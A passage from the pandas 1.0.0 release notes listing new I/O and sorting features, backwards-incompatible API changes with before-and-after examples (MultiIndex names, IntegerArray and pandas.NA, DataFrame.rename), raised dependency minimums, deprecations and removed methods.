back in with :meth:`~DataFrame.to_parquet` / :func:`read_parquet`)\n  is supported starting with pyarrow >= 0.16 (:issue:`20612`).\n- :func:`to_parquet` now appropriately handles the ``schema`` argument for user defined schemas in the pyarrow engine. (:issue:`30270`)\n- :meth:`DataFrame.to_json` now accepts an ``indent`` integer argument to enable pretty printing of JSON output (:issue:`12004`)\n- :meth:`read_stata` can read Stata 119 dta files. (:issue:`28250`)\n- Implemented :meth:`.Window.var` and :meth:`.Window.std` functions (:issue:`26597`)\n- Added ``encoding`` argument to :meth:`DataFrame.to_string` for non-ascii text (:issue:`28766`)\n- Added ``encoding`` argument to :func:`DataFrame.to_html` for non-ascii text (:issue:`28663`)\n- :meth:`Styler.background_gradient` now accepts ``vmin`` and ``vmax`` arguments (:issue:`12145`)\n- :meth:`Styler.format` added the ``na_rep`` parameter to help format the missing values (:issue:`21527`, :issue:`28358`)\n- :func:`read_excel` now can read binary Excel (``.xlsb``) files by passing ``engine='pyxlsb'``. For more details and example usage, see the :ref:`Binary Excel files documentation <io.xlsb>`. Closes :issue:`8540`.\n- The ``partition_cols`` argument in :meth:`DataFrame.to_parquet` now accepts a string (:issue:`27117`)\n- :func:`pandas.read_json` now parses ``NaN``, ``Infinity`` and ``-Infinity`` (:issue:`12213`)\n- DataFrame constructor preserve ``ExtensionArray`` dtype with ``ExtensionArray`` (:issue:`11363`)\n- :meth:`DataFrame.sort_values` and :meth:`Series.sort_values` have gained ``ignore_index`` keyword to be able to reset index after sorting (:issue:`30114`)\n- :meth:`DataFrame.sort_index` and :meth:`Series.sort_index` have gained ``ignore_index`` keyword to reset index (:issue:`30114`)\n- :meth:`DataFrame.drop_duplicates` has gained ``ignore_index`` keyword to reset index (:issue:`30114`)\n- Added new writer for exporting Stata dta files in versions 118 and 119, ``StataWriterUTF8``.  These files formats support exporting strings containing Unicode characters. Format 119 supports data sets with more than 32,767 variables (:issue:`23573`, :issue:`30959`)\n- :meth:`Series.map` now accepts ``collections.abc.Mapping`` subclasses as a mapper (:issue:`29733`)\n- Added an experimental :attr:`~DataFrame.attrs` for storing global metadata about a dataset (:issue:`29062`)\n- :meth:`Timestamp.fromisocalendar` is now compatible with python 3.8 and above (:issue:`28115`)\n- :meth:`DataFrame.to_pickle` and :func:`read_pickle` now accept URL (:issue:`30163`)\n\n\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_100.api_breaking.MultiIndex._names:\n\nAvoid using names from ``MultiIndex.levels``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAs part of a larger refactor to :class:`MultiIndex` the level names are now\nstored separately from the levels (:issue:`27242`). We recommend using\n:attr:`MultiIndex.names` to access the names, and :meth:`Index.set_names`\nto update the names.\n\nFor backwards compatibility, you can still *access* the names via the levels.\n\n.. ipython:: python\n\n   mi = pd.MultiIndex.from_product([[1, 2], ['a', 'b']], names=['x', 'y'])\n   mi.levels[0].name\n\nHowever, it is no longer possible to *update* the names of the ``MultiIndex``\nvia the level.\n\n.. ipython:: python\n   :okexcept:\n\n   mi.levels[0].name = \"new name\"\n   mi.names\n\nTo update, use ``MultiIndex.set_names``, which returns a new ``MultiIndex``.\n\n.. ipython:: python\n\n   mi2 = mi.set_names(\"new name\", level=0)\n   mi2.names\n\nNew repr for :class:`~pandas.arrays.IntervalArray`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`pandas.arrays.IntervalArray` adopts a new ``__repr__`` in accordance with other array classes (:issue:`25022`)\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.arrays.IntervalArray.from_tuples([(0, 1), (2, 3)])\n   Out[2]:\n   IntervalArray([(0, 1], (2, 3]],\n                 closed='right',\n                 dtype='interval[int64]')\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.arrays.IntervalArray.from_tuples([(0, 1), (2, 3)])\n\n``DataFrame.rename`` now only accepts one positional argument\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.rename` would previously accept positional arguments that would lead\nto ambiguous or undefined behavior. From pandas 1.0, only the very first argument, which\nmaps labels to their new names along the default axis, is allowed to be passed by position\n(:issue:`29136`).\n\n.. ipython:: python\n   :suppress:\n\n   df = pd.DataFrame([[1]])\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame([[1]])\n   In [2]: df.rename({0: 1}, {0: 2})\n   Out[2]:\n   FutureWarning: ...Use named arguments to resolve ambiguity...\n      2\n   1  1\n\n*pandas 1.0.0*\n\n.. code-block:: ipython\n\n   In [3]: df.rename({0: 1}, {0: 2})\n   Traceback (most recent call last):\n   ...\n   TypeError: rename() takes from 1 to 2 positional arguments but 3 were given\n\nNote that errors will now be raised when conflicting or potentially ambiguous arguments are provided.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [4]: df.rename({0: 1}, index={0: 2})\n   Out[4]:\n      0\n   1  1\n\n   In [5]: df.rename(mapper={0: 1}, index={0: 2})\n   Out[5]:\n      0\n   2  1\n\n*pandas 1.0.0*\n\n.. code-block:: ipython\n\n   In [6]: df.rename({0: 1}, index={0: 2})\n   Traceback (most recent call last):\n   ...\n   TypeError: Cannot specify both 'mapper' and any of 'index' or 'columns'\n\n   In [7]: df.rename(mapper={0: 1}, index={0: 2})\n   Traceback (most recent call last):\n   ...\n   TypeError: Cannot specify both 'mapper' and any of 'index' or 'columns'\n\nYou can still change the axis along which the first positional argument is applied by\nsupplying the ``axis`` keyword argument.\n\n.. ipython:: python\n\n   df.rename({0: 1})\n   df.rename({0: 1}, axis=1)\n\nIf you would like to update both the index and column labels, be sure to use the respective\nkeywords.\n\n.. ipython:: python\n\n   df.rename(index={0: 1}, columns={0: 2})\n\nExtended verbose info output for :class:`~pandas.DataFrame`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.info` now shows line numbers for the columns summary (:issue:`17304`)\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame({\"int_col\": [1, 2, 3],\n   ...                    \"text_col\": [\"a\", \"b\", \"c\"],\n   ...                    \"float_col\": [0.0, 0.1, 0.2]})\n   In [2]: df.info(verbose=True)\n   <class 'pandas.core.frame.DataFrame'>\n   RangeIndex: 3 entries, 0 to 2\n   Data columns (total 3 columns):\n   int_col      3 non-null int64\n   text_col     3 non-null object\n   float_col    3 non-null float64\n   dtypes: float64(1), int64(1), object(1)\n   memory usage: 152.0+ bytes\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"int_col\": [1, 2, 3],\n                      \"text_col\": [\"a\", \"b\", \"c\"],\n                      \"float_col\": [0.0, 0.1, 0.2]})\n   df.info(verbose=True)\n\n:meth:`pandas.array` inference changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`pandas.array` now infers pandas' new extension types in several cases (:issue:`29791`):\n\n1. String data (including missing values) now returns a :class:`arrays.StringArray`.\n2. Integer data (including missing values) now returns a :class:`arrays.IntegerArray`.\n3. Boolean data (including missing values) now returns the new :class:`arrays.BooleanArray`\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.array([\"a\", None])\n   Out[1]:\n   <PandasArray>\n   ['a', None]\n   Length: 2, dtype: object\n\n   In [2]: pd.array([1, None])\n   Out[2]:\n   <PandasArray>\n   [1, None]\n   Length: 2, dtype: object\n\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.array([\"a\", None])\n   pd.array([1, None])\n\nAs a reminder, you can specify the ``dtype`` to disable all inference.\n\n:class:`arrays.IntegerArray` now uses :attr:`pandas.NA`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`arrays.IntegerArray` now uses :attr:`pandas.NA` rather than\n:attr:`numpy.nan` as its missing value marker (:issue:`29964`).\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: a = pd.array([1, 2, None], dtype=\"Int64\")\n   In [2]: a\n   Out[2]:\n   <IntegerArray>\n   [1, 2, NaN]\n   Length: 3, dtype: Int64\n\n   In [3]: a[2]\n   Out[3]:\n   nan\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   a = pd.array([1, 2, None], dtype=\"Int64\")\n   a\n   a[2]\n\nThis has a few API-breaking consequences.\n\n**Converting to a NumPy ndarray**\n\nWhen converting to a NumPy array missing values will be ``pd.NA``, which cannot\nbe converted to a float. So calling ``np.asarray(integer_array, dtype=\"float\")``\nwill now raise.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n    In [1]: np.asarray(a, dtype=\"float\")\n    Out[1]:\n    array([ 1.,  2., nan])\n\n*pandas 1.0.0*\n\n.. ipython:: python\n   :okexcept:\n\n   np.asarray(a, dtype=\"float\")\n\nUse :meth:`arrays.IntegerArray.to_numpy` with an explicit ``na_value`` instead.\n\n.. ipython:: python\n\n   a.to_numpy(dtype=\"float\", na_value=np.nan)\n\n**Reductions can return** ``pd.NA``\n\nWhen performing a reduction such as a sum with ``skipna=False``, the result\nwill now be ``pd.NA`` instead of ``np.nan`` in presence of missing values\n(:issue:`30958`).\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n    In [1]: pd.Series(a).sum(skipna=False)\n    Out[1]:\n    nan\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.Series(a).sum(skipna=False)\n\n**value_counts returns a nullable integer dtype**\n\n:meth:`Series.value_counts` with a nullable integer dtype now returns a nullable\ninteger dtype for the values.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.Series([2, 1, 1, None], dtype=\"Int64\").value_counts().dtype\n   Out[1]:\n   dtype('int64')\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.Series([2, 1, 1, None], dtype=\"Int64\").value_counts().dtype\n\nSee :ref:`missing_data.NA` for more on the differences between :attr:`pandas.NA`\nand :attr:`numpy.nan`.\n\n:class:`arrays.IntegerArray` comparisons return :class:`arrays.BooleanArray`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nComparison operations on a :class:`arrays.IntegerArray` now returns a\n:class:`arrays.BooleanArray` rather than a NumPy array (:issue:`29964`).\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: a = pd.array([1, 2, None], dtype=\"Int64\")\n   In [2]: a\n   Out[2]:\n   <IntegerArray>\n   [1, 2, NaN]\n   Length: 3, dtype: Int64\n\n   In [3]: a > 1\n   Out[3]:\n   array([False,  True, False])\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   a = pd.array([1, 2, None], dtype=\"Int64\")\n   a > 1\n\nNote that missing values now propagate, rather than always comparing unequal\nlike :attr:`numpy.nan`. See :ref:`missing_data.NA` for more.\n\nBy default :meth:`Categorical.min` now returns the minimum instead of np.nan\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen :class:`Categorical` contains ``np.nan``,\n:meth:`Categorical.min` no longer return ``np.nan`` by default (skipna=True) (:issue:`25303`)\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.Categorical([1, 2, np.nan], ordered=True).min()\n   Out[1]: nan\n\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.Categorical([1, 2, np.nan], ordered=True).min()\n\n\nDefault dtype of empty :class:`pandas.Series`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nInitialising an empty :class:`pandas.Series` without specifying a dtype will raise a ``DeprecationWarning`` now\n(:issue:`17261`). The default dtype will change from ``float64`` to ``object`` in future releases so that it is\nconsistent with the behaviour of :class:`DataFrame` and :class:`Index`.\n\n*pandas 1.0.0*\n\n.. code-block:: ipython\n\n   In [1]: pd.Series()\n   Out[2]:\n   DeprecationWarning: The default dtype for empty Series will be 'object' instead of 'float64' in a future version. Specify a dtype explicitly to silence this warning.\n   Series([], dtype: float64)\n\nResult dtype inference changes for resample operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe rules for the result dtype in :meth:`DataFrame.resample` aggregations have changed for extension types (:issue:`31359`).\nPreviously, pandas would attempt to convert the result back to the original dtype, falling back to the usual\ninference rules if that was not possible. Now, pandas will only return a result of the original dtype if the\nscalar values in the result are instances of the extension dtype's scalar type.\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": ['a', 'b']}, dtype='category',\n                     index=pd.date_range('2000', periods=2))\n   df\n\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]> df.resample(\"2D\").agg(lambda x: 'a').A.dtype\n   Out[1]:\n   CategoricalDtype(categories=['a', 'b'], ordered=False)\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   df.resample(\"2D\").agg(lambda x: 'a').A.dtype\n\nThis fixes an inconsistency between ``resample`` and ``groupby``.\nThis also fixes a potential bug, where the **values** of the result might change\ndepending on how the results are cast back to the original dtype.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1] df.resample(\"2D\").agg(lambda x: 'c')\n   Out[1]:\n\n        A\n   0  NaN\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   df.resample(\"2D\").agg(lambda x: 'c')\n\n\n.. _whatsnew_100.api_breaking.python:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.0.0 supports Python 3.6.1 and higher (:issue:`29212`).\n\n.. _whatsnew_100.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome minimum supported versions of dependencies were updated (:issue:`29766`, :issue:`29723`).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.13.3          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2015.4          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.6.1           |    X     |         |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.6.2           |          |         |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 4.0.2           |          |         |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.3.2           |    X    |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.2.2           |         |\n+-----------------+-----------------+---------+\n| lxml            | 3.8.0           |         |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.2           |         |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |    X    |\n+-----------------+-----------------+---------+\n| openpyxl        | 2.5.7           |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.13.0          |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.7.1           |         |\n+-----------------+-----------------+---------+\n| pytables        | 3.4.2           |         |\n+-----------------+-----------------+---------+\n| s3fs            | 0.3.0           |    X    |\n+-----------------+-----------------+---------+\n| scipy           | 0.19.0          |         |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.1.4           |         |\n+-----------------+-----------------+---------+\n| xarray          | 0.8.2           |         |\n+-----------------+-----------------+---------+\n| xlrd            | 1.1.0           |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 0.9.8           |         |\n+-----------------+-----------------+---------+\n| xlwt            | 1.2.0           |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\nBuild changes\n^^^^^^^^^^^^^\n\npandas has added a `pyproject.toml <https://www.python.org/dev/peps/pep-0517/>`_ file and will no longer include\ncythonized files in the source distribution uploaded to PyPI (:issue:`28341`, :issue:`20775`). If you're installing\na built distribution (wheel) or via conda, this shouldn't have any effect on you. If you're building pandas from\nsource, you should no longer need to install Cython into your build environment before calling ``pip install pandas``.\n\n\n.. _whatsnew_100.api.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` now raises on invalid operation names (:issue:`27489`)\n- :meth:`pandas.api.types.infer_dtype` will now return \"integer-na\" for integer and ``np.nan`` mix (:issue:`27283`)\n- :meth:`MultiIndex.from_arrays` will no longer infer names from arrays if ``names=None`` is explicitly provided (:issue:`27292`)\n- In order to improve tab-completion, pandas does not include most deprecated attributes when introspecting a pandas object using ``dir`` (e.g. ``dir(df)``).\n  To see which attributes are excluded, see an object's ``_deprecations`` attribute, for example ``pd.DataFrame._deprecations`` (:issue:`28805`).\n- The returned dtype of :func:`unique` now matches the input dtype. (:issue:`27874`)\n- Changed the default configuration value for ``options.matplotlib.register_converters`` from ``True`` to ``\"auto\"`` (:issue:`18720`).\n  Now, pandas custom formatters will only be applied to plots created by pandas, through :meth:`~DataFrame.plot`.\n  Previously, pandas' formatters would be applied to all plots created *after* a :meth:`~DataFrame.plot`.\n  See :ref:`units registration <whatsnew_100.matplotlib_units>` for more.\n- :meth:`Series.dropna` has dropped its ``**kwargs`` argument in favor of a single ``how`` parameter.\n  Supplying anything else than ``how`` to ``**kwargs`` raised a ``TypeError`` previously (:issue:`29388`)\n- When testing pandas, the new minimum required version of pytest is 5.0.1 (:issue:`29664`)\n- :meth:`Series.str.__iter__` was deprecated and will be removed in future releases (:issue:`28277`).\n- Added ``<NA>`` to the list of default NA values for :meth:`read_csv` (:issue:`30821`)\n\n.. _whatsnew_100.api.documentation:\n\nDocumentation improvements\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Added new section on :ref:`scale` (:issue:`28315`).\n- Added sub-section on :ref:`io.query_multi` for HDF5 datasets (:issue:`28791`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- :meth:`Series.item` and :meth:`Index.item` have been _undeprecated_ (:issue:`29250`)\n- ``Index.set_value`` has been deprecated. For a given index ``idx``, array ``arr``,\n  value in ``idx`` of ``idx_val`` and a new value of ``val``, ``idx.set_value(arr, idx_val, val)``\n  is equivalent to ``arr[idx.get_loc(idx_val)] = val``, which should be used instead (:issue:`28621`).\n- :func:`is_extension_type` is deprecated, :func:`is_extension_array_dtype` should be used instead (:issue:`29457`)\n- :func:`eval` keyword argument \"truediv\" is deprecated and will be removed in a future version (:issue:`29812`)\n- :meth:`DateOffset.isAnchored` and :meth:`DatetOffset.onOffset` are deprecated and will be removed in a future version, use :meth:`DateOffset.is_anchored` and :meth:`DateOffset.is_on_offset` instead (:issue:`30340`)\n- ``pandas.tseries.frequencies.get_offset`` is deprecated and will be removed in a future version, use ``pandas.tseries.frequencies.to_offset`` instead (:issue:`4205`)\n- :meth:`Categorical.take_nd` and :meth:`CategoricalIndex.take_nd` are deprecated, use :meth:`Categorical.take` and :meth:`CategoricalIndex.take` instead (:issue:`27745`)\n- The parameter ``numeric_only`` of :meth:`Categorical.min` and :meth:`Categorical.max` is deprecated and replaced with ``skipna`` (:issue:`25303`)\n- The parameter ``label`` in :func:`lreshape` has been deprecated and will be removed in a future version (:issue:`29742`)\n- ``pandas.core.index`` has been deprecated and will be removed in a future version, the public classes are available in the top-level namespace (:issue:`19711`)\n- :func:`pandas.json_normalize` is now exposed in the top-level namespace.\n  Usage of ``json_normalize`` as ``pandas.io.json.json_normalize`` is now deprecated and\n  it is recommended to use ``json_normalize`` as :func:`pandas.json_normalize` instead (:issue:`27586`).\n- The ``numpy`` argument of :meth:`pandas.read_json` is deprecated (:issue:`28512`).\n- :meth:`DataFrame.to_stata`, :meth:`DataFrame.to_feather`, and :meth:`DataFrame.to_parquet` argument \"fname\" is deprecated, use \"path\" instead (:issue:`23574`)\n- The deprecated internal attributes ``_start``, ``_stop`` and ``_step`` of :class:`RangeIndex` now raise a ``FutureWarning`` instead of a ``DeprecationWarning`` (:issue:`26581`)\n- The ``pandas.util.testing`` module has been deprecated. Use the public API in ``pandas.testing`` documented at :ref:`api.general.testing` (:issue:`16232`).\n- ``pandas.SparseArray`` has been deprecated.  Use ``pandas.arrays.SparseArray`` (:class:`arrays.SparseArray`) instead. (:issue:`30642`)\n- The parameter ``is_copy`` of :meth:`Series.take` and :meth:`DataFrame.take` has been deprecated and will be removed in a future version. (:issue:`27357`)\n- Support for multi-dimensional indexing (e.g. ``index[:, None]``) on a :class:`Index` is deprecated and will be removed in a future version, convert to a numpy array before indexing instead (:issue:`30588`)\n- The ``pandas.np`` submodule is now deprecated. Import numpy directly instead (:issue:`30296`)\n- The ``pandas.datetime`` class is now deprecated. Import from ``datetime`` instead (:issue:`30610`)\n- :class:`~DataFrame.diff` will raise a ``TypeError`` rather than implicitly losing the dtype of extension types in the future. Convert to the correct dtype before calling ``diff`` instead (:issue:`31025`)\n\n**Selecting Columns from a Grouped DataFrame**\n\nWhen selecting columns from a :class:`DataFrameGroupBy` object, passing individual keys (or a tuple of keys) inside single brackets is deprecated,\na list of items should be used instead. (:issue:`23566`) For example:\n\n.. code-block:: ipython\n\n    df = pd.DataFrame({\n        \"A\": [\"foo\", \"bar\", \"foo\", \"bar\", \"foo\", \"bar\", \"foo\", \"foo\"],\n        \"B\": np.random.randn(8),\n        \"C\": np.random.randn(8),\n    })\n    g = df.groupby('A')\n\n     single key, returns SeriesGroupBy\n    g['B']\n\n     tuple of single key, returns SeriesGroupBy\n    g[('B',)]\n\n     tuple of multiple keys, returns DataFrameGroupBy, raises FutureWarning\n    g[('B', 'C')]\n\n     multiple keys passed directly, returns DataFrameGroupBy, raises FutureWarning\n     (implicitly converts the passed strings into a single tuple)\n    g['B', 'C']\n\n     proper way, returns DataFrameGroupBy\n    g[['B', 'C']]\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n**Removed SparseSeries and SparseDataFrame**\n\n``SparseSeries``, ``SparseDataFrame`` and the ``DataFrame.to_sparse`` method\nhave been removed (:issue:`28425`). We recommend using a ``Series`` or\n``DataFrame`` with sparse values instead.\n\n.. _whatsnew_100.matplotlib_units:\n\n**Matplotlib unit registration**\n\nPreviously, pandas would register converters with matplotlib as a side effect of importing pandas (:issue:`18720`).\nThis changed the output of plots made via matplotlib plots after pandas was imported, even if you were using\nmatplotlib directly rather than :meth:`~DataFrame.plot`.\n\nTo use pandas formatters with a matplotlib plot, specify\n\n.. code-block:: ipython\n\n   In [1]: import pandas as pd\n   In [2]: pd.options.plotting.matplotlib.register_converters = True\n\nNote that plots created by :meth:`DataFrame.plot` and :meth:`Series.plot` *do* register the converters\nautomatically. The only behavior change is when plotting a date-like object via ``matplotlib.pyplot.plot``\nor ``matplotlib.Axes.plot``. See :ref:`plotting.formatters` for more.\n\n**Other removals**\n\n- Removed the previously deprecated keyword \"index\" from :func:`read_stata`, :class:`StataReader`, and :meth:`StataReader.read`, use \"index_col\" instead (:issue:`17328`)\n- Removed ``StataReader.data`` method, use :meth:`StataReader.read` instead (:issue:`9493`)\n- Removed ``pandas.plotting._matplotlib.tsplot``, use :meth:`Series.plot` instead (:issue:`19980`)\n- ``pandas.tseries.converter.register`` has been moved to :func:`pandas.plotting.register_matplotlib_converters` (:issue:`18307`)\n- :meth:`Series.plot` no longer accepts positional arguments, pass keyword arguments instead (:issue:`30003`)\n- :meth:`DataFrame.hist` and :meth:`Series.hist` no longer allows ``figsize=\"default\"``, specify figure size by passinig a tuple instead (:issue:`30003`)\n- Floordiv of integer-dtyped array by :class:`Timedelta` now raises ``TypeError`` (:issue:`21036`)\n- :class:`TimedeltaIndex` and :class:`DatetimeIndex` no longer accept non-nanosecond dtype strings like \"timedelta64\" or \"datetime64\", use \"timedelta64[ns]\" and \"datetime64[ns]\" instead (:issue:`24806`)\n- Changed the default \"skipna\" argument in :func:`pandas.api.types.infer_dtype` from ``False`` to ``True`` (:issue:`24050`)\n- Removed ``Series.ix`` and ``DataFrame.ix`` (:issue:`26438`)\n- Removed ``Index.summary`` (:issue:`18217`)\n- Removed the previously deprecated keyword \"fastpath\" from the :class:`Index` constructor (:issue:`23110`)\n- Removed ``Series.get_value``, ``Series.set_value``, ``DataFrame.get_value``, ``DataFrame.set_value`` (:issue:`17739`)\n- Removed ``Series.compound`` and ``DataFrame.compound`` (:issue:`26405`)\n- Changed the default \"inplace\" argument in :meth:`DataFrame.set_index` and :meth:`Series.set_axis` from ``None`` to ``False`` (:issue:`27600`)\n- Removed ``Series.cat.categorical``, ``Series.cat.index``, ``Series.cat.name`` (:issue:`24751`)\n- Removed the previously deprecated keyword \"box\" from :func:`to_datetime` and :func:`to_timedelta`; in addition these now always returns :class:`DatetimeIndex`, :class:`TimedeltaIndex`, :class:`Index`, :class:`Series`, or :class:`DataFrame` (:issue:`24486`)\n- :func:`to_timedelta`, :class:`Timedelta`, and :class:`TimedeltaIndex` no longer allow \"M\", \"y\", or \"Y\" for the \"unit\" argument (:issue:`23264`)\n- Removed the previously deprecated keyword \"time_rule\" from (non-public) ``offsets.generate_range``, which has been moved to :func:`core.arrays._ranges.generate_range` (:issue:`24157`)\n- :meth:`DataFrame.loc` or :meth:`Series.loc` with listlike indexers and missing labels will no longer reindex (:issue:`17295`)\n- :meth:`DataFrame.to_excel` and :meth:`Series.to_excel` with non-existent columns will no longer reindex (:issue:`17295`)\n- Removed the previously deprecated keyword \"join_axes\" from :func:`concat`; use ``reindex_like`` on the result instead (:issue:`22318`)\n- Removed the previously deprecated keyword \"by\" from :meth:`DataFrame.sort_index`, use :meth:`DataFrame.sort_values` instead (:issue:`10726`)\n- Removed support for nested renaming in :meth:`DataFrame.aggregate`, :meth:`Series.aggregate`, :meth:`core.groupby.DataFrameGroupBy.aggregate`, :meth:`core.groupby.SeriesGroupBy.aggregate`, :meth:`core.window.rolling.Rolling.aggregate` (:issue:`18529`)\n- Passing ``datetime64`` data to :class:`TimedeltaIndex` or ``timedelta64`` data to ``DatetimeIndex`` now raises ``TypeError`` (:issue:`23539`, :issue:`23937`)\n- Passing ``int64`` values to :class:`DatetimeIndex` and a timezone now interprets the values as nanosecond timestamps in UTC, not wall times in the given timezone (:issue:`24559`)\n- A tuple passed to :meth:`DataFrame.groupby` is now exclusively treated as a single key (:issue:`18314`)\n- Removed ``Index.contains``, use ``key in index`` instead (:issue:`30103`)\n- Addition and subtraction of ``int`` or integer-arrays is no longer allowed in :class:`Timestamp`, :class:`DatetimeIndex`, :class:`TimedeltaIndex`, use ``obj + n * obj.freq`` instead of ``obj + n`` (:issue:`22535`)\n- Removed ``Series.ptp`` (:issue:`21614`)\n- Removed ``Series.from_array`` (:issue:`18258`)\n- Removed ``DataFrame.from_items`` (:issue:`18458`)\n- Removed ``DataFrame.as_matrix``, ``Series.as_matrix`` (:issue:`18458`)\n- Removed ``Series.asobject`` (:issue:`18477`)\n- Removed ``DataFrame.as_blocks``, ``Series.as_blocks``, ``DataFrame.blocks``, ``Series.blocks`` (:issue:`17656`)\n- :meth:`pandas.Series.str.cat` now defaults to aligning ``others``, using ``join='left'`` (:issue:`27611`)\n- :meth:`pandas.Series.str.cat` does not accept list-likes *within* list-likes anymore (:issue:`27611`)\n- :meth:`Series.where` with ``Categorical`` dtype (or :meth:`DataFrame.where` with ``Categorical`` column) no longer allows setting new categories (:issue:`24114`)\n- Removed the previously deprecated keywords \"start\", \"end\", and \"periods\" from the :class:`DatetimeIndex`, :class:`TimedeltaIndex`, and :class:`PeriodIndex` constructors; use :func:`date_range`, :func:`timedelta_range`, and :func:`period_range` instead (:issue:`23919`)\n- Removed the previously deprecated keyword \"verify_integrity\" from the :class:`DatetimeIndex` and :class:`TimedeltaIndex` constructors (:issue:`23919`)\n- Removed the previously deprecated keyword \"fastpath\" from ``pandas.core.internals.blocks.make_block`` (:issue:`19265`)\n- Removed the previously deprecated keyword \"dtype\" from :meth:`Block.make_block_same_class` (:issue:`19434`)\n- Removed ``ExtensionArray._formatting_values``. Use :attr:`ExtensionArray._formatter` instead. (:issue:`23601`)\n- Removed ``MultiIndex.to_hierarchical`` (:issue:`21613`)\n- Removed ``MultiIndex.labels``, use :attr:`MultiIndex.codes` instead (:issue:`23752`)\n- Removed the previously deprecated keyword \"labels\" from the :class:`MultiIndex` constructor, use \"codes\" instead (:issue:`23752`)\n- Removed ``MultiIndex.set_labels``, use :meth:`MultiIndex.set_codes` instead (:issue:`23752`)\n- Removed the previously deprecated keyword \"labels\" from :meth:`MultiIndex.set_codes`, :meth:`MultiIndex.copy`, :meth:`MultiIndex.drop`, use \"codes\" instead (:issue:`23752`)\n- Removed support for legacy HDF5 formats 